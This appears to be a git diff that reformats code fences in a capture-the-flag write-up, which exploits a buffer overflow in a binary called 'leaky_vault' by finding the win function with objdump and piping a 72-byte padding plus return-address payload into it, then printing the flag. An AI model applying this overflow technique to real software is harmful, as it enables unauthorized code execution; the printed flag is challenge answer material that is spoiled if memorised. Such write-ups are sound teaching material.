@@ -8,11 +8,12 @@ To locate the address of the win function, I used objdump to disassemble the bin
 bash
 Copy
 
-`┌──(myenv)─(zwique㉿kali)-[~/Downloads]
+```
+┌──(myenv)─(zwique㉿kali)-[~/Downloads]
 └─$ objdump -d leaky_vault | grep win
 000000000040084c <win>:
   400874:       540000c1        b.ne    40088c <win+0x40>  // b.any
-`
+```
 The address of the win function is 0x40084c.
 2. Exploit the Buffer Overflow
 
@@ -26,8 +27,10 @@ I crafted a payload consisting of:
 
 The payload was generated using Python
 
-```┌──(zwique㉿kali)-[~/Downloads]
+```
+┌──(zwique㉿kali)-[~/Downloads]
 └─$ python3 -c 'print("A" * 72 + "\x4c\x08\x40\x00\x00\x00\x00\x00")' | ./leaky_vault
+```
 
 3. Execute the Exploit
 
@@ -38,11 +41,12 @@ Enter your input: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 uacCTF{m3m9ry_l2ak_3xpl0it_CS1410}
 
 The flag is: uacCTF{m3m9ry_l2ak_3xpl0it_CS1410}.
-```
-Alternative: Using an Exploit Script
 
+Alternative: Using an Exploit Script
+```
 ┌──(zwique㉿kali)-[~/Downloads]
 └─$ python3 exp.py
+```
 
 Conclusion
 
